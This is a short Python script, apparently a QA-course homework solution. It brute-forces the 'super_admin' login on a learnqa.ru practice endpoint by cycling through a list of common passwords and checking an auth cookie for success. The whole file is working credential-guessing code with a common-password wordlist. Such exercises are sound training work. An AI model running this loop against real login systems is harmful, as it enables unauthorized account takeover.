import requests

password_array = ["password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "1234567", "monkey"
    ,"111111", "1234", "1234567890", "sunshine", "iloveyou", "trustno1", "princess", "dragon", "adobe123", "football"
    ,"baseball","123123", "login", "admin", "welcome", "qwerty123", "solo", "1q2w3e4r", "master", "666666", "photoshop",
    "1qaz2wsx","qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey", "access", "flower", "555555",
    "passw0rd","shadow", "lovely", "letmein", "7777777""michael", "!@#$%^&*", "jesus", "superman", "hello", "charlie"
    , "888888","696969", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald"
    , "batman","zaq1zaq1", "password1"
]
i = 0
while i < len(password_array):
    login = "super_admin"
    password = password_array[i]
    param = {"login": login, "password": password}
    print(param)
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=param)
    cookie_parse = response.cookies.get('auth_cookie')
    cookie = {"auth_cookie": cookie_parse}

    response1 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookie)
    valid_text = "You are authorized"
    if valid_text in response1.text:
        print("Valid password: " + password)
        print(response1.text)
        break

    i = i + 1
